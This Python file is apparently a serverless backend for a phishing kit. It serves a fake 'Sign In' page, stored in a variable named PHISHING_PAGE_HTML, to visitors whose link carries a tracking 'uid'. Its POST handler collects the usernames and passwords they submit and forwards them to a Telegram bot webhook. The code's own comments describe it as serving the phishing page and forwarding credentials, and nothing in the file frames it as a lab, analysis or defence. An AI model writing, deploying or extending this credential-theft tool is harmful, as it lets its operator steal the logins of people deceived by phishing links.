import os
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import requests
import json

TELEGRAM_BOT_WEBHOOK_URL = os.environ.get("TELEGRAM_BOT_WEBHOOK_URL", "YOUR_BOT_WEBHOOK_URL") # E.g., https://your-bot-hosting.com/webhook
PHISHING_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="login-container">
        <h2>Sign In</h2>
        <form id="loginForm">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Log In</button>
        </form>
        <p class="error-message" id="errorMessage" style="display: none; color: red;"></p>
    </div>
    <script src="/script.js"></script>
</body>
</html>
"""

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query_components = parse_qs(urlparse(self.path).query)
        uid = query_components.get("uid", [None])[0]

        if uid:
            # Serve the phishing page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(PHISHING_PAGE_HTML.encode('utf-8'))
        else:
            self.send_response(400)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write("Missing 'uid' parameter. This link requires a user ID.".encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))

        username = data.get('username')
        password = data.get('password')
        uid = data.get('uid')

        if username and password and uid:
            payload = {
                "username": username,
                "password": password,
                "uid": uid
            }
            try:
                # Forward credentials to the Telegram bot's webhook
                requests.post(TELEGRAM_BOT_WEBHOOK_URL, json=payload)
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success", "message": "Credentials received"}).encode('utf-8'))
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
        else:
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": "Missing username, password, or UID"}).encode('utf-8'))
